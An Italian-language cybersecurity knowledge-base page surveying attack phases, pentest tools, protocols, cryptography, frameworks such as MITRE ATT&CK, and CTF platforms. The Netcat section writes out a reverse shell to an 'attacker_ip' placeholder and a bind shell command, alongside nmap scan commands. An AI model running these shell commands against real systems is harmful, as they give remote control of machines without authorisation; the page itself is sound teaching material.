201~200~# Cybersecurity – Conoscenza Base

## Concetti fondamentali

La cybersecurity è la disciplina che si occupa di proteggere sistemi, reti e dati da attacchi, accessi non autorizzati e danni. Si divide in più aree: offensive security (penetration testing, red team), defensive security (blue team, SOC), e forensics.

La CIA Triad è il modello base della sicurezza informatica:
- Confidentiality (Riservatezza): solo chi è autorizzato può accedere ai dati
- Integrity (Integrità): i dati non vengono alterati senza autorizzazione
- Availability (Disponibilità): i sistemi devono essere accessibili quando serve

## Tipologie di attacco

### Reconnaissance
Raccolta di informazioni sul target prima dell'attacco.
- Passive recon: OSINT, Shodan, Google Dork, Whois, DNS lookup
- Active recon: nmap, ping sweep, port scanning

### Scanning & Enumeration
- nmap: scansione porte e servizi (es. nmap -sV -sC -p- target)
- netcat: connessioni raw TCP/UDP
- enum4linux: enumerazione SMB su Windows/Samba
- gobuster / ffuf: directory bruteforce su web server

### Exploitation
- Metasploit Framework: framework per exploit automatizzati
- Buffer overflow: sovrascrittura dello stack per eseguire codice arbitrario
- SQL Injection: iniezione di codice SQL in input non sanificati
- XSS (Cross-Site Scripting): iniezione di script nel browser della vittima
- CSRF: forza un utente autenticato a eseguire azioni non volute
- LFI/RFI: inclusione di file locali o remoti in applicazioni web

### Privilege Escalation
Tecnica per ottenere privilegi più alti sul sistema compromesso.
- Linux: SUID binaries, cron jobs, sudo misconfig, kernel exploits
- Windows: token impersonation, unquoted service paths, registry keys

### Post-Exploitation
- Persistence: backdoor, cron job, servizi di sistema
- Lateral movement: spostarsi su altri sistemi nella rete
- Data exfiltration: estrarre dati dal sistema compromesso
- Covering tracks: eliminare log e tracce

## Strumenti principali

### Kali Linux / Parrot OS
Distribuzioni Linux dedicate al penetration testing con centinaia di tool preinstallati.

### nmap
Scanner di rete per individuare host, porte aperte e servizi.
Comandi utili:
- nmap -sn 192.168.1.0/24 (host discovery)
- nmap -sV -sC target (versioni e script default)
- nmap -p- target (tutte le porte)
- nmap -A target (aggressive scan)

### Burp Suite
Proxy per intercettare e manipolare traffico HTTP/HTTPS.
Usato per testare applicazioni web: analisi richieste, fuzzing, scanner vulnerabilità.

### Metasploit
Framework per sviluppare ed eseguire exploit. Componenti principali:
- msfconsole: interfaccia principale
- search: cerca exploit/moduli
- use: seleziona un modulo
- set RHOSTS / LHOST: configura target e listener
- exploit / run: lancia l'attacco

### Wireshark
Analizzatore di pacchetti di rete. Utile per sniffing, analisi protocolli, forensics.

### Hydra / John the Ripper / Hashcat
Tool per password cracking:
- Hydra: bruteforce online (SSH, FTP, HTTP, ecc.)
- John the Ripper: cracking offline di hash
- Hashcat: cracking accelerato via GPU

### Netcat
"Coltellino svizzero" della rete. Usato per:
- Reverse shell: nc -e /bin/bash attacker_ip port
- Bind shell: nc -lvnp port -e /bin/bash
- Trasferimento file, port scanning, banner grabbing

## Reti e protocolli

- TCP/IP: protocollo base di internet, connessione orientata (handshake a 3 vie)
- UDP: protocollo senza connessione, più veloce ma inaffidabile
- DNS (porta 53): risoluzione nomi di dominio in indirizzi IP
- HTTP/HTTPS (porte 80/443): protocollo web
- SSH (porta 22): accesso remoto sicuro
- FTP (porte 20/21): trasferimento file
- SMB (porta 445): condivisione file Windows
- SMTP/IMAP/POP3: protocolli email

### Attacchi di rete comuni
- MITM (Man in the Middle): intercettazione comunicazioni
- ARP Spoofing: avvelenamento cache ARP per reindirizzare traffico
- DNS Spoofing: risposta falsa a query DNS
- DoS/DDoS: saturazione delle risorse del target

---

## Crittografia

- Simmetrica: stessa chiave per cifrare e decifrare (AES, DES)
- Asimmetrica: coppia chiave pubblica/privata (RSA, ECC)
- Hash: funzione one-way, produce digest di lunghezza fissa (MD5, SHA-1, SHA-256)
- TLS/SSL: protocollo per comunicazioni cifrate su rete

---

## Metodologie e framework

- PTES (Penetration Testing Execution Standard): standard per pentest professionali
- OWASP: linee guida per sicurezza applicazioni web
- MITRE ATT&CK: matrice di tattiche e tecniche usate dagli attaccanti
- CVE (Common Vulnerabilities and Exposures): database vulnerabilità note
- CVSS: sistema di scoring per la gravità delle vulnerabilità

---

## CTF (Capture The Flag)

Competizioni di cybersecurity dove si risolvono sfide per trovare una "flag".
Categorie comuni:
- Web: vulnerabilità applicazioni web
- Pwn: binary exploitation, buffer overflow
- Crypto: crittografia e decifratura
- Forensics: analisi file, immagini disco, memoria RAM
- Reversing: reverse engineering di binari
- OSINT: raccolta informazioni da fonti aperte
- Steganography: messaggi nascosti in immagini/file

Piattaforme: HackTheBox, TryHackMe, PicoCTF, CTFtime
